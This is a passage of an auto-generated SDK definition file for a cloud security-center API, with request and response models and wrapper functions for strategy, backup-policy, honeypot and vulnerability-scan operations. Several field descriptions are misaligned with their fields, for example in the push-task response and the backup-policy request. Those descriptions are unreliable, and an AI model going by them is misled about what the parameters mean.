        osVersion?: string(name='OsVersion', example='linux'),
        region?: string(name='Region', description='1.2.XX.XX', example='cn-beijing'),
        success?: boolean(name='Success', description='The ID of the request, which is used to locate and troubleshoot issues.', example='false'),
        uuid?: string(name='Uuid', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**: yes
*   **false**: no

>  If the Security Center agent of the server is offline, Security Center does not protect the server.', example='5493fe42-61f5-4627-9aa2-8c449bbe****'),
      }
    ](name='PushTaskResultList', description='The UUID of the server.'),
  }(name='PushTaskRsp', description='The ID of the server group to which the server belongs.'),
  requestId?: string(name='RequestId', description='HEALTH_CHECK,OVAL_ENTITY', example='91EB4AC7-7FEF-4C72-BE49-4414E459AEC2'),
}

model ModifyPushAllTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPushAllTaskResponseBody(name='body'),
}

async function modifyPushAllTaskWithOptions(request: ModifyPushAllTaskRequest, runtime: Util.RuntimeOptions): ModifyPushAllTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tasks)) {
    query['Tasks'] = request.tasks;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPushAllTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyPushAllTask(request: ModifyPushAllTaskRequest): ModifyPushAllTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPushAllTaskWithOptions(request, runtime);
}

model ModifyRefreshProcessInfoRequest {
  uuid?: string(name='Uuid', example='0f3b8f76-90e5-4455-a5aa-23ce30b5****'),
}

model ModifyRefreshProcessInfoResponseBody = {
  requestId?: string(name='RequestId', example='814FCBBC-3A02-5555-8D05-F8D9FD62A295'),
}

model ModifyRefreshProcessInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRefreshProcessInfoResponseBody(name='body'),
}

async function modifyRefreshProcessInfoWithOptions(request: ModifyRefreshProcessInfoRequest, runtime: Util.RuntimeOptions): ModifyRefreshProcessInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRefreshProcessInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyRefreshProcessInfo(request: ModifyRefreshProcessInfoRequest): ModifyRefreshProcessInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRefreshProcessInfoWithOptions(request, runtime);
}

model ModifyRiskCheckStatusRequest {
  itemId?: long(name='ItemId', description='The ID of the check item.', example='37'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.223.XX.XX'),
  status?: string(name='Status', description='The method to handle the check item. Valid values:

*   **ignored**: ignores the check item
*   **reset**: cancels ignoring the check item', example='ignored'),
  taskId?: long(name='TaskId', description='The ID of the check task to which the check item belongs.', example='57'),
}

model ModifyRiskCheckStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model ModifyRiskCheckStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskCheckStatusResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the following operations:
  * \\-To **ignore a check item**, use the AddCheckResultWhiteList operation.
  * \\-To **cancel ignoring a check item**, use the RemoveCheckResultWhiteList operation.
  *
  * @param request ModifyRiskCheckStatusRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyRiskCheckStatusResponse
 */
// Deprecated
async function modifyRiskCheckStatusWithOptions(request: ModifyRiskCheckStatusRequest, runtime: Util.RuntimeOptions): ModifyRiskCheckStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRiskCheckStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * This operation is phased out. You can use the following operations:
  * \\-To **ignore a check item**, use the AddCheckResultWhiteList operation.
  * \\-To **cancel ignoring a check item**, use the RemoveCheckResultWhiteList operation.
  *
  * @param request ModifyRiskCheckStatusRequest
  * @return ModifyRiskCheckStatusResponse
 */
// Deprecated
async function modifyRiskCheckStatus(request: ModifyRiskCheckStatusRequest): ModifyRiskCheckStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRiskCheckStatusWithOptions(request, runtime);
}

model ModifyRiskSingleResultStatusRequest {
  ids?: [ string ](name='Ids', description='The IDs of the affected assets.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.XX.XX'),
  status?: string(name='Status', description='The method to handle the risk item. Valid values:

*   **ignored**: ignores the risk item.
*   **failed**: cancels ignoring the risk item.', example='ignored'),
  taskId?: long(name='TaskId', description='The ID of the check task to which the affected assets belong.', example='57'),
}

model ModifyRiskSingleResultStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
}

model ModifyRiskSingleResultStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskSingleResultStatusResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the following operations:
  * \\-To **ignore a risk item**, use the AddCheckInstanceResultWhiteList operation.
  * \\-To **cancel ignoring a risk item**, use the RemoveCheckInstanceResultWhiteList operation.
  *
  * @param request ModifyRiskSingleResultStatusRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyRiskSingleResultStatusResponse
 */
// Deprecated
async function modifyRiskSingleResultStatusWithOptions(request: ModifyRiskSingleResultStatusRequest, runtime: Util.RuntimeOptions): ModifyRiskSingleResultStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRiskSingleResultStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * This operation is phased out. You can use the following operations:
  * \\-To **ignore a risk item**, use the AddCheckInstanceResultWhiteList operation.
  * \\-To **cancel ignoring a risk item**, use the RemoveCheckInstanceResultWhiteList operation.
  *
  * @param request ModifyRiskSingleResultStatusRequest
  * @return ModifyRiskSingleResultStatusResponse
 */
// Deprecated
async function modifyRiskSingleResultStatus(request: ModifyRiskSingleResultStatusRequest): ModifyRiskSingleResultStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRiskSingleResultStatusWithOptions(request, runtime);
}

model ModifySecurityCheckScheduleConfigRequest {
  daysOfWeek?: string(name='DaysOfWeek', example='4,5,6'),
  endTime?: int32(name='EndTime', example='12'),
  lang?: string(name='Lang', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX'),
  startTime?: int32(name='StartTime', example='6'),
}

model ModifySecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', example='02287C0D-8DA9-5766-B51A-A63192BD3E80'),
}

model ModifySecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request ModifySecurityCheckScheduleConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfigWithOptions(request: ModifySecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifySecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.daysOfWeek)) {
    query['DaysOfWeek'] = request.daysOfWeek;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request ModifySecurityCheckScheduleConfigRequest
  * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfig(request: ModifySecurityCheckScheduleConfigRequest): ModifySecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityCheckScheduleConfigWithOptions(request, runtime);
}

model ModifySecurityEventMarkMissIndividuallyRequest {
  deleteMarkMissParam?: string(name='DeleteMarkMissParam', example='[{\\"field\\":\\"loginSourceIp\\",\\"operate\\":\\"contains\\",\\"eventType\\":\\"SIL_AI_ALERT\\",\\"eventName\\":\\"login_common_ip\\",\\"fieldValue\\":\\"10.12.XX.XX\\",\\"uuids\\":\\"\\"}]'),
  from?: string(name='From', example='sas'),
  insertMarkMissParam?: string(name='InsertMarkMissParam', example='[{\\"field\\":\\"location\\",\\"operate\\":\\"contains\\",\\"eventType\\":\\"SIL_AI_ALERT\\",\\"eventName\\":\\"login_common_ip\\",\\"fieldValue\\":\\"xx\\",\\"uuids\\":\\"4296ee47-bf19-4fa4-a4a6-6bxxxxxxxxx\\"}]'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='127.0.XX.XX'),
}

model ModifySecurityEventMarkMissIndividuallyResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A37B852F-E346-5FF2-82BD-D1F1DXXXXXX'),
  success?: boolean(name='Success', example='true'),
  timeCost?: long(name='TimeCost', example='1'),
}

model ModifySecurityEventMarkMissIndividuallyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityEventMarkMissIndividuallyResponseBody(name='body'),
}

async function modifySecurityEventMarkMissIndividuallyWithOptions(request: ModifySecurityEventMarkMissIndividuallyRequest, runtime: Util.RuntimeOptions): ModifySecurityEventMarkMissIndividuallyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.deleteMarkMissParam)) {
    body['DeleteMarkMissParam'] = request.deleteMarkMissParam;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.insertMarkMissParam)) {
    body['InsertMarkMissParam'] = request.insertMarkMissParam;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityEventMarkMissIndividually',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifySecurityEventMarkMissIndividually(request: ModifySecurityEventMarkMissIndividuallyRequest): ModifySecurityEventMarkMissIndividuallyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityEventMarkMissIndividuallyWithOptions(request, runtime);
}

model ModifyStartVulScanRequest {
  types?: string(name='Types', example='"cve,sys,cms,app,emg"'),
  uuids?: string(name='Uuids', example='{"i-sdada-xxxxx","i-ifaedada-sfsasdxxx"}'),
}

model ModifyStartVulScanResponseBody = {
  requestId?: string(name='RequestId', example='4066CAC3-F83A-4729-9995-A5558A61B546'),
}

model ModifyStartVulScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStartVulScanResponseBody(name='body'),
}

async function modifyStartVulScanWithOptions(request: ModifyStartVulScanRequest, runtime: Util.RuntimeOptions): ModifyStartVulScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStartVulScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStartVulScan(request: ModifyStartVulScanRequest): ModifyStartVulScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStartVulScanWithOptions(request, runtime);
}

model ModifyStrategyRequest {
  customType?: string(name='CustomType', example='common'),
  cycleDays?: string(name='CycleDays', example='1'),
  cycleStartTime?: string(name='CycleStartTime', example='18'),
  endTime?: string(name='EndTime', example='05:00:00'),
  id?: string(name='Id', example='245'),
  name?: string(name='Name', example='testStrategy'),
  riskCustomParams?: string(name='RiskCustomParams', example='[{"typeName":"hc_centos_6_custom","checkDetails":[{"checkId":4,"rules":[{"ruleId":"pass_min_days_login_defs.must.cus","paramList":[{"paramName":"range_val","value":"7"}]}]}]}]'),
  riskSubTypeName?: string(name='RiskSubTypeName', example='hc_exploit_redis'),
  sourceIp?: string(name='SourceIp', example='192.168.X.X'),
  startTime?: string(name='StartTime', example='00:01:00'),
  targetType?: string(name='TargetType', example='groupId'),
}

model ModifyStrategyResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='8EFA2BD9-00CD-5D69-B6B0-4EE83EAF072E'),
  result?: {
    strategyId?: int32(name='StrategyId', example='8164239'),
  }(name='Result'),
  success?: boolean(name='Success', example='true'),
}

model ModifyStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyResponseBody(name='body'),
}

async function modifyStrategyWithOptions(request: ModifyStrategyRequest, runtime: Util.RuntimeOptions): ModifyStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.cycleDays)) {
    query['CycleDays'] = request.cycleDays;
  }
  if (!Util.isUnset(request.cycleStartTime)) {
    query['CycleStartTime'] = request.cycleStartTime;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.riskCustomParams)) {
    query['RiskCustomParams'] = request.riskCustomParams;
  }
  if (!Util.isUnset(request.riskSubTypeName)) {
    query['RiskSubTypeName'] = request.riskSubTypeName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStrategy(request: ModifyStrategyRequest): ModifyStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyWithOptions(request, runtime);
}

model ModifyStrategyTargetRequest {
  config?: string(name='Config', example='{"strategyId":8070645}'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX'),
  target?: string(name='Target', example='[{"Target":"9273980","BindUuidCount":5320,"TargetType":"groupId","Flag":"del"},{"Target":"9677606","TargetType":"groupId","Flag":"del"},{"Target":"10121607","BindUuidCount":7,"TargetType":"groupId","Flag":"add"},{"Target":"10670708","BindUuidCount":2,"TargetType":"groupId","Flag":"del"},{"Target":"11246338","BindUuidCount":6,"TargetType":"groupId","Flag":"del"},{"Target":"11291161","BindUuidCount":13,"TargetType":"groupId","Flag":"del"}]'),
  type?: string(name='Type', example='hc_strategy'),
}

model ModifyStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', example='0E147337-5B0B-5776-B0B6-D569DBA8F60F'),
}

model ModifyStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyTargetResponseBody(name='body'),
}

async function modifyStrategyTargetWithOptions(request: ModifyStrategyTargetRequest, runtime: Util.RuntimeOptions): ModifyStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStrategyTarget(request: ModifyStrategyTargetRequest): ModifyStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyTargetWithOptions(request, runtime);
}

model ModifyTagWithUuidRequest {
  machineTypes?: string(name='MachineTypes', example='ecs'),
  tagId?: string(name='TagId', example='3897941'),
  tagList?: string(name='TagList', example='ac,ad'),
  uuidList?: string(name='UuidList', example='e2737dc3-78f4-4653-a986-dc5fad4b****,c189f0e3-df22-42d5-a73d-02c05667****'),
}

model ModifyTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', example='70C4B40D-D55E-4B7B-9992-8535E396B2F4'),
}

model ModifyTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyTagWithUuidResponseBody(name='body'),
}

async function modifyTagWithUuidWithOptions(request: ModifyTagWithUuidRequest, runtime: Util.RuntimeOptions): ModifyTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.tagId)) {
    query['TagId'] = request.tagId;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyTagWithUuid(request: ModifyTagWithUuidRequest): ModifyTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyTagWithUuidWithOptions(request, runtime);
}

model ModifyUniBackupPolicyRequest {
  accountName?: string(name='AccountName', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**', example='sa'),
  accountPassword?: string(name='AccountPassword', description='The data returned.', example='Sa@****'),
  fullPlan?: map[string]any(name='FullPlan', description='The ID of the request, which is used to locate and troubleshoot issues.', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlan?: map[string]any(name='IncPlan', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  policyId?: long(name='PolicyId', description='The name of the database account.', example='123'),
  policyName?: string(name='PolicyName', description='The password of the database account.', example='databak'),
  policyStatus?: string(name='PolicyStatus', example='enabled'),
  retention?: int32(name='Retention', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='1048576'),
}

model ModifyUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**', example='sa'),
  accountPassword?: string(name='AccountPassword', description='The data returned.', example='Sa@****'),
  fullPlanShrink?: string(name='FullPlan', description='The ID of the request, which is used to locate and troubleshoot issues.', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlanShrink?: string(name='IncPlan', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  policyId?: long(name='PolicyId', description='The name of the database account.', example='123'),
  policyName?: string(name='PolicyName', description='The password of the database account.', example='databak'),
  policyStatus?: string(name='PolicyStatus', example='enabled'),
  retention?: int32(name='Retention', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='1048576'),
}

model ModifyUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='3F6FAB39-5AF7-5B2C-A17D-16D52AE0****'),
}

model ModifyUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyUniBackupPolicyResponseBody(name='body'),
}

async function modifyUniBackupPolicyWithOptions(tmpReq: ModifyUniBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.policyStatus)) {
    query['PolicyStatus'] = request.policyStatus;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyUniBackupPolicy(request: ModifyUniBackupPolicyRequest): ModifyUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyUniBackupPolicyWithOptions(request, runtime);
}

model ModifyVpcHoneyPotRequest {
  honeyPotAction?: string(name='HoneyPotAction', example='disable'),
  vpcId?: string(name='VpcId', example='vpc-d7o009q63fqy21r8u****'),
}

model ModifyVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', example='8158FE9E-19BE-42D6-9F7A-9BE34A2DE1D5'),
}

model ModifyVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVpcHoneyPotResponseBody(name='body'),
}

async function modifyVpcHoneyPotWithOptions(request: ModifyVpcHoneyPotRequest, runtime: Util.RuntimeOptions): ModifyVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeyPotAction)) {
    query['HoneyPotAction'] = request.honeyPotAction;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVpcHoneyPot(request: ModifyVpcHoneyPotRequest): ModifyVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVpcHoneyPotWithOptions(request, runtime);
}

model ModifyVulConfigRequest {
  config?: string(name='Config', example='on'),
  type?: string(name='Type', example='cve'),
}

model ModifyVulConfigResponseBody = {
  requestId?: string(name='RequestId', example='24DDBE06-58FF-5E5E-9241-D2010D7913C1'),
}

model ModifyVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulConfigResponseBody(name='body'),
}

async function modifyVulConfigWithOptions(request: ModifyVulConfigRequest, runtime: Util.RuntimeOptions): ModifyVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulConfig(request: ModifyVulConfigRequest): ModifyVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulConfigWithOptions(request, runtime);
}

model ModifyVulTargetRequest {
